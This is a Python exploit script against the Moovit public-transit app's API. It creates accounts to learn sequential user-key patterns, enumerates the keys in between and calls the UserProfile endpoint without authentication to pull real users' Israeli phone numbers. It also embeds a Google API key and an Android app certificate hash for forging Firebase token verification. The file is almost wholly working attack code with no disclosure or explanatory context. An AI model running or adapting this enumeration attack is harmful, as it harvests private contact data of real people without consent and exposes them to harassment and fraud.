import requests
import json
from time import sleep
import urllib3
import queue
import threading
import time


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
create_user_url = "https://app4.moovitapp.com/services-app/services/V4/UserDetails/CreateUser"
headers_req = {"CLIENT_VERSION": "5.94.2.530",
                "Content-Type": "application/octet-stream", 
                "Content-Length": "253",
                "host":"app4.moovitapp.com"}

proxies = {'https' : 'http://127.0.0.1:8888'}
E053_CONST = "E0530100007F"
gaps_users_queue = queue.PriorityQueue()

def user_profile(user_key, access_token):
    global proxies
    api_url = 'https://app4.moovitapp.com/services-app/services/V4/UserDetails/UserProfile'
    headers = {
        'USER_KEY': user_key,
        # 'Access-Token': access_token,
    }
    data = open(r"real_create_user_request.bin", 'rb').read()
    response = requests.post(api_url, verify=False ,proxies=proxies, headers=headers, data=data)
    
    return response

def verify_custom_token(token):
    global proxies
    api_url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyCustomToken?key=AIzaSyBkZSYR6T3PYyZ6ery0LP_6e7k1Ia3TRjM'
     
    headers = {
        'X-Android-Package' : 'com.tranzmate',
        'X-Android-Cert' : 'C56ABF7C6890113ED6654E381E2A1797DA3E7F6A'
    }
    x = {
        "token": token.decode('utf-8'),
        "returnSecureToken": True
    }
    data = json.dumps(x)

    headers['Content-Length'] = str(len(data))

    response = requests.post(api_url, verify=False ,proxies=proxies, headers=headers, data=data)

    if response.ok:
        access_token_json = json.loads(response.content)
        # print('[+] Custom_Token has Verified')
        # print(f'[+] Access-Token --> {access_token_json}')
        return access_token_json
    else:
        print('[!] Verify Custon Token Failed')

def firebase_register(user_key):
    global proxies
    api_url = 'https://app4.moovitapp.com/services-app/services/Firebase/Register'
    headers = {
        'USER_KEY' : user_key,
        'App-Id' : '1'
    }

    response = requests.post(api_url, verify=False, proxies=proxies, headers=headers)
    if response.ok:
        custom_token = response.content[7:-1]
        return custom_token
    else:
        print('[!] Error registering to firebase')
        return None


def add_gaps_to_queue(key_name, users_list):
    first_user = int(users_list[0],16)
    last_user = int(users_list[1],16)
    for i in range(first_user, last_user):
        curr_seq = hex(i).upper()[2:]
        s = key_name.split('-')    
        user_id = curr_seq + s[0] + E053_CONST + s[1]
        gaps_users_queue.put((int(time.time()), user_id))
    # print(list(gaps_users_queue.queue))

def add_gap_users():
    global proxies
    with open(r"real_create_user_request.bin", 'rb') as user_input:
        user_in = user_input.read()
        users_dict = dict()
        idx = 1
        while True:
            try:
                res = requests.post(create_user_url, verify=False, data=user_in,proxies=proxies, headers=headers_req)
                res = res.content[10:42].decode('utf')
                curr_seq_num    = res[:12]
                first_rnd_num   = res[12:16]
                E053_num        = res[16:28]
                sec_rnd_num     = res[28:32]
                
                if E053_num != E053_CONST:
                    sleep(1)
                    continue

                idx+=1
                key_name = first_rnd_num + '-' + sec_rnd_num

                if key_name in users_dict.keys():
                    users_dict[key_name].append(curr_seq_num)
                    add_gaps_to_queue(key_name, users_dict[key_name])
                    users_dict[key_name] = users_dict[key_name][1:]     # removing first element
                else:
                    users_dict[key_name] = [curr_seq_num]
                sleep(5)

            except KeyboardInterrupt as e:
                print(e)
                break
            except Exception as e:
                print(e)
                pass


def get_users_deatils():
    while True:
        try:
            current_time = int(time.time())
            tmp_users = []
            for _ in range(len(gaps_users_queue.queue)):
                priorety_time, current_user  = gaps_users_queue.get()
                time_passed = current_time - priorety_time
                
                if time_passed < 180:
                    tmp_users.append((priorety_time, current_user))
                    break
                
                response = user_profile(current_user, None)
                
                if response.ok and b'+' in response.content:
                    idx = response.content.find(b'+')
                    phone = response.content[idx:idx+13].decode('utf')
                    if phone.startswith('+972'):
                        print(f'[+][Found Profile] --> {current_user} -> {phone}')
                else:
                    if time_passed < 300:              # users not staying in the queue after 5 min 
                        tmp_users.append((priorety_time, current_user))


            for user in tmp_users:
                gaps_users_queue.put(user)

            sleep(60)

        except KeyboardInterrupt as e:
            print(e)
            break
        except Exception as e:
            print(e)
            pass


try:

    print("Collecting users..")
    add_users_thread            = threading.Thread(target=add_gap_users).start()
    get_users_details_thread    = threading.Thread(target=get_users_deatils).start()
    gaps_users_queue.join()
except KeyboardInterrupt:
    exit(1)
